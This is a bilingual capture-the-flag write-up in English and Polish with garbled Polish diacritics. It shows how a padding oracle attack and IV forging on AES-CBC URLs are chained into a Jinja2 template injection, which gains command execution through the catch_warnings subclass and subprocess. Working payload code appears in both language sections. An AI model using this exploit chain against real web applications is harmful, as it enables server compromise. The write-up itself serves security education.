# Mark is falling down drunk (crypto/web)

## ENG
[PL](#pl-version)

In the task we get a link for a webpage where someone deployed an application for parsing markdown.
There are a couple of example links.
We notice that the URL is always the same, but the contains a long hex-string, which probably points to the actual page displayed.
If we modify the hex-string the page crashes or gives us `incorrect url` message.

This seems like a standard setup for padding oracle attack.
We assume that the hex-string is actually AES CBC encrypted data.
The first 16 bytes seems to indicate this even more because they are always `deadbeefcafedeadbeefcafe04030201` which seems like a nice IV.

So we run our padding oracle attack. 
For more in depth description of the attack refer to our previous writeups on this.
In short we exploit the fact that by manipulating value of previous ciphertext block we can influence the plaintext value or corresponding byte in the next block, directly from the CBC definition.
And if we accidentally set the last byte to `\01` then the decryption will not fail, since this is a proper padding.
We can then recover the real value of this last byte because we know that `ciphertext[k-1][n] xor decrypt(ciphertext[k][n])` is now `\01` and we know the value of `ciphertext[k-1][n]`.
We can then proceed to setting last 2 bytes to `\02\02` and so on to recover everything.

Using our code from crypto commons with:

```python
import requests
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

data = 'deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65'

print(oracle_padding_recovery(data, oracle))

# https://gitlab.com/gitlab-org/gitlab-ce/raw/master/README.md
```

And we do the same for all the links.
There is a problem there, because for some reason we can't recover the first block.
The server was crashing when there was only one plaintext block.
But this was not really an issue, since the links were quite obvious and we could just guess the missing bytes.

The most interesting link was the one for their own example, which contained something like

```
{{ config['page'] }}
```

In the content, but when viewed with their Markdown parser it was presenting an actual link.
This meant that we could evaluate templates if we can get a ciphertext for our own webpage.

This was a bit of an issue, since standard approach would be to change the IV so that first block of the plaintext decrypts to `http://our.page\01` and sending just the IV and this one block.

Just as a reminder, we can do this since decryption of 1st block for CBC is `IV xor decrypt(ciphertext[0])`, and since we know the IV and we know the value of `decrypt(ciphertext[0])` we can simply set selected IV byte to: 
`newIV[k] = IV[k] xor plaintext[k] xor expected_value`

And the decryption will give us `expected_value` at `k-th` position.

In our scenario this would not work, because the single block payloads were failing (maybe admins fixed this later?).
Anyway, we figured that we can also instead set the first block to: `http://our.page?` and leave the other blocks, because now the rest of some other URL will be treated as GET parameters and the link will work fine.

This way we got an example payload:

```python
data = 'deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02'.decode("hex")
old_iv = list(data[:16])
target_payload = list(pad("https://p4.team?"))
pt = "https://raw.githubusercontent.com/dlitz/pycrypto/master/README\02\02"[:16]
new_iv = "".join([chr(ord(old_iv[i]) ^ ord(pt[i]) ^ ord(target_payload[i])) for i in range(16)])
payload = (new_iv + data[16:]).encode("hex")
print(payload)
```

And by passing this payload we can now load our markdown code on the server.

Now we move to the template injection exploit.
We use a classic approach to do `''.__class__.__mro__[1].__subclasses__()` to get list of all subclasses of `object` loaded in python.
There was a small problem, because the `__something__` was actually interpreted as markdown and replaced by `<strong>something</strong>` so we had to put the payload in backticks to avoid this.

Once we got a list of all classes we found the `catch_warnings` which we could exploit:

```
{% set loadedClasses = ''.__class__.__mro__[1].__subclasses__() %} 
{% for loadedClass in loadedClasses %} 
	{% if loadedClass.__name__ == 'catch_warnings' %} 
		{% set builtinsReference = loadedClass()._module.__builtins__ %} 
		{% set os = builtinsReference['__import__']('subprocess') %}
		{{ os.check_output('cat app/flag', shell=True) }}
	{% endif %} 
{% endfor %} 
```

and get the flag `NDH{edfba7f05f2d0a30f54b0820105cdab21f59b60a7d72f5c7b38c23db840d6cab}`

## PL version

W zadaniu dostajemy link do strony gdzie kto?? udost??pni?? swoj?? aplikacje do parsowania markdown.
Jest tam kilka przyk??adowych link??w.
Zauwa??amy, ??e URL jest zawsze taki sam, ale zawiera d??ugi hex-string, kt??ry najpewniej opisuje w??asciw?? stron??.
Je??li zmienimy ten hex-string to strona si?? wysypuje lub dostajemy `incorrect url`.

To wygl??da jak standardowy setup dla ataku padding oracle.
Zak??adamy tu, ??e hex-string to w rzeczywisto??ci szyfrogram AES CBC.
Pierwsze 16 bajt??w mocno to sugeruje bo to zawsze `deadbeefcafedeadbeefcafe04030201` co wygl??da na jakie?? IV.

Uruchamiamy wi??c nasz padding oracle.
Dla bardziej szczeg????owego opisu tego ataku odsy??amy do naszych poprzednich writeup??w na ten temat.
W skr??cie wykorzystujemy tu fakt, ??e manipuluj??c warto??ci?? poprzedniego bloku szyfrogramu mo??emy wp??yn???? na deszyfrowanie odpowiedniego bajtu nast??pnego bloku, bezpo??rednio z definicji CBC.
Je??li przypadkowo zmienimy ostatni bajt na `\01` to deszyfrowanie nie zg??osi b????du, bo padding b??dzie poprawny.
Mo??emy wtedy odkry?? prawdziw?? warto???? tego ostatniego bajtu, bo wiemy, ??e `ciphertext[k-1][n] xor decrypt(ciphertext[k][n])` wynosi teraz `\01` a znamy warto???? `ciphertext[k-1][n]`.
Nast??pnie mo??emy powt??rzy?? to samo, ale tym razem ustawiaj??c dwa ostatnie bloki na `\02\02` itd a?? odzyskamy ca???? odszyfrowan?? wiadomo????.

Z u??yciem naszego kodu z crypto commons:

```python
import requests
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

data = 'deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65'

print(oracle_padding_recovery(data, oracle))

# https://gitlab.com/gitlab-org/gitlab-ce/raw/master/README.md
```

I post??pujemy tak samo dla wszystkich link??w.
Jest tam pewien problem, poniewa?? nie mo??emy odzyska?? 1 bloku.
Serwer wysypuje si?? je??li jest tylko 1 blok szyfrogramu.
To na szcz????cie nie stanowi??o wielkiego problemu, bo linki by??y do???? oczywiste i mogli??my zgadn???? brakujace bajty.

Najbardziej interesuj??cy by?? link do przyk??adu od autor??w zadania, kt??ry zawiera?? co?? w stylu:

```
{{ config['page'] }}
```

W tre??ci, podczas gdy na stronie po sparsowaniu Markdown widnia?? faktyczny link.
To oznacza ??e mo??na ewaluowa?? szablony, je??li tylko mo??emy przekaza?? tam w??asn?? stron??.

To stanowi??o jednak pocz??tkowo problem, bo standardowe podej??cie to ustawi?? IV tak, zeby pierwszy blok odszyfrowanego tekstu deszyfrowa?? si?? do `http://our.page\01` i wys??anie tylko nowego IV i tego jednego bloku.

Dla przypomnienia, mo??emy tak zrobi??, bo deszyfrowanie 1 bloku to `IV xor decrypt(ciphertext[0])` a skoro znamy IV i wiemy jaka jest warto???? `decrypt(ciphertext[0])` to mo??emy ustawi?? wybrany bajt IV do:
`newIV[k] = IV[k] xor plaintext[k] xor expected_value`

A deszyfrowanie da nam `expected_value` na `k-tej` pozycji.

W naszym przypadku to nie mog??o zadzia??a??, bo jeden blok szyfrogramu powodowa?? b????d serwera (admini to p????niej poprawili?).
Tak czy siak, wymy??lili??my jak ten problem obej????, przez ustawienie pierwszego bloku na `http://our.page?` i pozostawienie pozosta??ych blok??w, poniewa?? teraz ten pozosta??y fragment starego URLa b??dzie potraktowany jako parametry GET a nasz link zadzia??a poprawnie.

W ten spos??b dostajemy szyfrogram:

```python
data = 'deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02'.decode("hex")
old_iv = list(data[:16])
target_payload = list(pad("https://p4.team?"))
pt = "https://raw.githubusercontent.com/dlitz/pycrypto/master/README\02\02"[:16]
new_iv = "".join([chr(ord(old_iv[i]) ^ ord(pt[i]) ^ ord(target_payload[i])) for i in range(16)])
payload = (new_iv + data[16:]).encode("hex")
print(payload)
```

I przekazuj??c do go strony mo??emy teraz ewaluowa?? nasz w??asny kod mardown na serwerze.

Teraz przechodzimy do template injection.
Stosujemy tu do???? standardowy zabieg `''.__class__.__mro__[1].__subclasses__()` aby pobra?? list?? podklas `object` za??adowanych w pythonie.

Tutaj mieli??my przez chwil?? problem bo `__co??tam__` by??o procesowane przez markdown i zamieniane na `<strong>co??tam</strong>`  wi??c musieli??my kod obj???? w backticki.

Maj??c list?? klas znale??li??my `catch_warnings` kt??re mo??na by??o wykorzysta??:

```
{% set loadedClasses = ''.__class__.__mro__[1].__subclasses__() %} 
{% for loadedClass in loadedClasses %} 
	{% if loadedClass.__name__ == 'catch_warnings' %} 
		{% set builtinsReference = loadedClass()._module.__builtins__ %} 
		{% set os = builtinsReference['__import__']('subprocess') %}
		{{ os.check_output('cat app/flag', shell=True) }}
	{% endif %} 
{% endfor %} 
```

aby dosta?? flag??: `NDH{edfba7f05f2d0a30f54b0820105cdab21f59b60a7d72f5c7b38c23db840d6cab}`
